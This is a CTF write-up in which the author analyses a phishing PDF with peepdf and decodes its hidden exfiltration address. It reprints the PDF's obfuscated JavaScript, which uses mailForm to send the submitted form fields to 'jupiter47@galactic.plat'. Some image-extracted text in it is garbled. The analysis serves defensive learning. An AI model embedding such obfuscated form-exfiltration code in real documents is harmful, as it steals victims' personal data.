# The Phish Tank - 3b
> An additional email sent from that same suspicious IP address contained an attached PDF document. The user who opened this document started to fill out the form, but became suspicious and reported it to Snowpoint’s security team instead of hitting the submit button.

> The Snowpoint security team would like you to download the attached PDF document and determine what would happen if the submit button was clicked.

> Where would the sensitive information provided in the form be sent?

> Flag format: email address. Example: icsjwgctf@gmail.com

## About the Challenge
We need to do reverse engineering on a PDF file to obtain the email (Sorry, I can't provide you the file, because its a malware)

## How to Solve?
First, im using static-analysis approach to find the flag and then using [peepdf](https://github.com/jesparza/peepdf). Here is the command I used

```shell
python2 peepdf.py -f /home/kali/Downloads/download.pdf -i
```


[Image extracted text: (kaliokali)-[~/Tools/peepdf]
python2 peepdf.py
Ihome/kali/Downloads/download _
Warning:
Pyv8
not
installed
Warning:
pylibemu
not
installed
Warning:
Python
Imaging Library
(PIL)
not
installed !!
File:
download .E
MDS :
aoo66dbe5ogffa5564930cbcacbbogge
SHAI
8bdbboabd45c7dcb35666f9497ca68611405b0a9
SHA256:
be60d47010b686787b1a53d1e8884e54204258582be56342fce9df46fb36bbld
Size:
33643
bytes
Vers
on:
1.6
Binary:
True
Linearized:
False
Encrypted:
False
Updates:
Objects:
Streams
URIs:
Comments:
Errors:


Version
Catalog:
Info:
Objects
(35):
[1,
9 , 10, 11, 12, 13, 14, 15, 16, 17 ,
18 ,
19 ,
20 , 21,
22 ,
23, 24, 25,
26 ,
27 ,
28 ,
29 ,
30 , 31,
32 ,
33,
34 , 35]
Streams
(13) :
13, 15, 17
21
23 ,
26 ,
28 ,
30 ,
32 , 34]
Encoded
(13) :
13 ,
19 ,
21,
23 ,
26 ,
28 ,
30 ,
32 , 34]
Objects
with JS
code
(1):
[4]
Suspicious
elements:
/Names
(1): [5]
IAA
(1): [7]
IJS (1): [4]
eheckoutinatsnet
thetatestteledseanalntx
/ JavaScript (2):
[4, 5]
pdf
pdf]


As you can see, there is malicious elements such as Javascripts in objects 4 and 5. And if we check the object using this command

```
object 4
```


[Image extracted text: PPDF >
object
{Type
{Action
Fheckoutanat
netinthetatestreledsalnt
/S / JavaScript
IJS
var
c80ac4
f9c2-this getField( function( ){var r-Array
prototype.slice
call(arguments) ,t-r.shift();return
.reverse(
.map(
function(r,0) {return String
fromCharCode(r-t-1-0)})).join(
)}(33,137
150,151)+995
toString(36) .toLowerCase( )+
function( ){var r-Array.prototype
slice
call(arguments) ,t-r.shift()
return
reverse(
.map(
function(r
0 ) {return String. fromCharcode(r-t-25-0)})).join(
2}(28,156,163,150) ) , feddc07405-function( ){var r-Array.prototype
slice
call(argument
s),t-r.shift();return
reverse(
.map(
function(r,0){return String.fromCharCode(r-t-14-0)})). Join("")}(14,134)+30 
toString(36 ) .toLowerCase( )+function( ){var r-Array prototype
slice call(arguments) ,t-r.shift();return
reverse(
.map( ( fu
nction(r,0){return String.fromCharCode(r-t-38-0)}) ) . join( "")}(4,154)+1137788359_
toString(36). toLowerCase( )+16
toString( 36) .toLowerCase( )   split("" )  map(
function(r){return String.fromCharCode(r
charCodeAt( )+-39)})).join(
)+function( )
{var r-Array _
funcototype{retcen
slice
call(arguments) ,t-r.shift()ireturn
reverse(
.map(
function(r,0){return String.fromCharCode(r-t-40-0)})).join("")}(36,176,186,174,179)+598116
toString( 36) . toLowerCase( )+30
toString( 36) . toLowerCase( ) .spli
) .map( (
String.fromCharCode(r charCodeAt( )+-71)})). join("" )+921 _toString(36) .toLowerCase( )+function( ){var r-Array.prototype
slice cal(arguments),t-r.shift();return
reverse
.map(
function(r,0){return String.fr
omCharCode(r-t-57-0)})). Join("")}(0,174,154),b15d02c677-this getField( 32788
toString( 36) .toLowerCase( )+function( ){var r-Array.prototype
slice
call(arguments) ,
ter
shift();return
reverse(
map(
function(r,0){return String. fromCharCode
(r-t-56-0)})).join(
9}(25,198,194,201,196)+13
toString(36).toLowerCase( )),run-0;1-erunobthis
mailForm( ! 1,feddc07405
c80ac4f9c2,b15d02c677) ;
t("]


And then there is an obfuscated javascript file like this

```javascript
var c80ac4f9c2=this.getField(function(){var r=Array.prototype.slice.call(arguments),t=r.shift();return r.reverse().map((function(r,o){return String.fromCharCode(r-t-1-o)})).join("")}(33,137,150,151)+995..toString(36).toLowerCase()+function(){var r=Array.prototype.slice.call(arguments),t=r.shift();return r.reverse().map((function(r,o){return String.fromCharCode(r-t-25-o)})).join("")}(28,156,163,150)),feddc07405=function(){var r=Array.prototype.slice.call(arguments),t=r.shift();return r.reverse().map((function(r,o){return String.fromCharCode(r-t-14-o)})).join("")}(14,134)+30..toString(36).toLowerCase()+function(){var r=Array.prototype.slice.call(arguments),t=r.shift();return r.reverse().map((function(r,o){return String.fromCharCode(r-t-38-o)})).join("")}(4,154)+1137788359..toString(36).toLowerCase()+16..toString(36).toLowerCase().split("").map((function(r){return String.fromCharCode(r.charCodeAt()+-39)})).join("")+function(){var r=Array.prototype.slice.call(arguments),t=r.shift();return r.reverse().map((function(r,o){return String.fromCharCode(r-t-40-o)})).join("")}(36,176,186,174,179)+598116..toString(36).toLowerCase()+30..toString(36).toLowerCase().split("").map((function(r){return String.fromCharCode(r.charCodeAt()+-71)})).join("")+921..toString(36).toLowerCase()+function(){var r=Array.prototype.slice.call(arguments),t=r.shift();return r.reverse().map((function(r,o){return String.fromCharCode(r-t-57-o)})).join("")}(0,174,154),b15d02c677=this.getField(32788..toString(36).toLowerCase()+function(){var r=Array.prototype.slice.call(arguments),t=r.shift();return r.reverse().map((function(r,o){return String.fromCharCode(r-t-56-o)})).join("")}(25,198,194,201,196)+13..toString(36).toLowerCase()),run=0;1==run&&this.mailForm(!1,feddc07405,"","",c80ac4f9c2,b15d02c677);
```

Im using some of the deobfuscator javascript tools online like this [one](https://lelinhtinh.github.io/de4js/) but the result is not i good. So I decided to execute the Javascript code manually on my browser console to obtain the email address

```javascript
var feddc07405=function(){var r=Array.prototype.slice.call(arguments),t=r.shift();return r.reverse().map((function(r,o){return String.fromCharCode(r-t-14-o)})).join("")}(14,134)+30..toString(36).toLowerCase()+function(){var r=Array.prototype.slice.call(arguments),t=r.shift();return r.reverse().map((function(r,o){return String.fromCharCode(r-t-38-o)})).join("")}(4,154)+1137788359..toString(36).toLowerCase()+16..toString(36).toLowerCase().split("").map((function(r){return String.fromCharCode(r.charCodeAt()+-39)})).join("")+function(){var r=Array.prototype.slice.call(arguments),t=r.shift();return r.reverse().map((function(r,o){return String.fromCharCode(r-t-40-o)})).join("")}(36,176,186,174,179)+598116..toString(36).toLowerCase()+30..toString(36).toLowerCase().split("").map((function(r){return String.fromCharCode(r.charCodeAt()+-71)})).join("")+921..toString(36).toLowerCase()+function(){var r=Array.prototype.slice.call(arguments),t=r.shift();return r.reverse().map((function(r,o){return String.fromCharCode(r-t-57-o)})).join("")}(0,174,154)
console.log(feddc07405)
```

So, the flag was located in `feddc07405` variable and we need to print the `feddc07405` variable to be able to read the flag


[Image extracted text: var feddc07405-function( ) {var r-Array
prototype.slice call(arguments)_
t-r.shift();return
reverse
map
(function(r,0)
{return String.fromcharCode(r-t-14-0
)). join("
(14,134)+30..toString(36).toLowerCase
+function
{var
r-Array
slice
call
(arguments),t=r.shift();return
r.reverse( ) .map( (function(r,o){return String.fromcharCode(r_
38-=
rofoiyee;;
(4,154)+1137788359
toString(36)
toLowerCase( )+16 _
toString(36)
toLowerCase( ) . split(
) .map( ( function(r){return
String. fromCharCode(r.charCoceAt()+-39)}) ) . join("
+function() {var
rahrray
slice
call
(arguments
t=r shift();return
r.reverse( ) .map( (function(r,o){return String.fromcharCode(r
[-48
Rrofotyre
(36,176_
186,174,179)+598116
(36_
toLowerCaser
+30.
toString
36) . toLowerCase
split('
map
(function(r){return
String.fromCharCode
chanCodec5t)ing{36);
join("")+921
toString
toLowerCase ( )+function(){var
rahrray
slice
call
(arguments
In
shift();return
rtreverse
map( (function(r,o){return String.fromcharCode(r
[-57-=
"3y;}  fotvre
)}(0,174,154)
undefined
console.log(fe
Uncaught SyntaxError: missing
after argument list
W73911
console.log(feddce7485)
jupiter47@galactic plat
LN758:1
undefined]


```
jupiter47@galactic.plat
```